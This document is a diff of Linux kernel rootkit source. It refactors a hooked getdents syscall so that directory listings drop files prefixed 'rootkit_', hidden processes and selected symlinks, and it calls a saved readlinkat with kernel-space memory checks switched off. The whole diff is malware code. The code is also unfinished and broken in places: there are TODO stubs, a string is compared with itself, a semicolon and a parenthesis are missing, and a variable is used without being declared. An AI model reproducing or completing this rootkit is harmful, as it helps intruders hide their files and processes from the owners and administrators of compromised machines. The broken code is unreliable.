@@ -18,9 +18,30 @@ asmlinkage ssize_t (*syscall_readlinkat) (int dirfd, const char *path, char *buf
  */
 static int getdents_call_counter = 0;
 
-/* Check whether we need to hide this file */
-int hide(char *d_name)
+/*
+ * check if we need to hide this file because it matches
+ * a path to be hidden. fd is the file descriptor for the
+ * path we are currently in, *d_name is the name of the
+ * file to check.
+ */
+int hide_fpath(int fd, char *d_name)
 {
+	// TODO: loop the list of paths to hide
+	if(strcmp(d_name, d_name) == 0)
+	{
+		
+	}
+	
+	return 0;
+}
+
+/*
+ * Check whether we need to hide this file because 
+ * of its prefix
+ */
+int hide_fprefix(char *d_name)
+{
+	// TODO: implement dynamic prefixes
 	if(strstr(d_name, "rootkit_") == d_name) 
 	{
 		return 1;
@@ -29,6 +50,43 @@ int hide(char *d_name)
 	{
 		return 1;
 	}
+
+	return 0;
+}
+
+/* 
+ * check if we need to hide a file because it is the process
+ * id of a hidden process. fd must match the /proc/ folder.
+ */
+int hide_process(int fd, char *d_name)
+{	
+	// TODO
+	
+	return 0;
+}
+
+int hide_symlink(int fd, char *d_name)
+{
+	mm_segment_t old_fs;
+	char lpath[128];
+	size_t lpath_len;
+	
+	do {
+		memset(lpath, 0, 128);	
+	
+		/* tell the kernel to ignore kernel-space memory in syscalls */
+		old_fs = get_fs();
+		set_fs(KERNEL_DS);
+	
+		/* execute our readlinkat syscall */
+		lpath_len = (*syscall_readlinkat) (fd, dirp->d_name, lpath, 128);
+	
+		/* reset the kernel */	
+		set_fs(old_fs);
+
+		// TODO: insert stop condition
+	
+	} while (lpath_len > 0)
 
 	return 0;
 }
@@ -50,7 +108,8 @@ int check_symlink(char *path)
 		return 0;
 	}
 
-	return hide(name);
+	//return hide(name);
+	return 0;
 }
 
 /*
@@ -61,10 +120,6 @@ asmlinkage int manipulated_getdents (unsigned int fd, struct linux_dirent __user
 {
 	getdents_call_counter++;
 	/* nothing else above this line */
-	
-	mm_segment_t old_fs;
-	char lpath[128];
-	size_t lpath_len;
 	
 	long ret;
 	int len = 0;
@@ -77,7 +132,6 @@ asmlinkage int manipulated_getdents (unsigned int fd, struct linux_dirent __user
 	{
 		len  = dirp->d_reclen;
 		tlen = tlen-len;
-		memset(lpath, 0, 128);	
 		
 		/* tell the kernel to ignore kernel-space memory in syscalls */
 		old_fs = get_fs();
@@ -92,14 +146,17 @@ asmlinkage int manipulated_getdents (unsigned int fd, struct linux_dirent __user
 		/* terminate the string properly */	
 		memset(lpath+lpath_len, '\0', 1);	
 
-		/* Check if we need to hide this symlink (only if it is a symlink ofc) */
-		if(lpath_len > 0 && check_symlink(lpath))
-		{
-			memmove(dirp, (char*) dirp + dirp->d_reclen,tlen);
-			ret -= len;
-		}	
+//		/* Check if we need to hide this symlink (only if it is a symlink ofc) */
+//		if(lpath_len > 0 && check_symlink(lpath))
+//		{
+//			memmove(dirp, (char*) dirp + dirp->d_reclen,tlen);
+//			ret -= len;
+//		}	
 		/* Check if we need to hide this file */
-		else if(hide(dirp->d_name))
+		if(hide_fpath(fd, dirp->d_name)
+				|| hide_fprefix(dirp->d_name)
+				|| hide_process(fd, dirp->d_name)
+				|| hide_symlink(fd, dirp->d_name))
 		{	
 			memmove(dirp, (char*) dirp + dirp->d_reclen,tlen);
 			ret -= len;
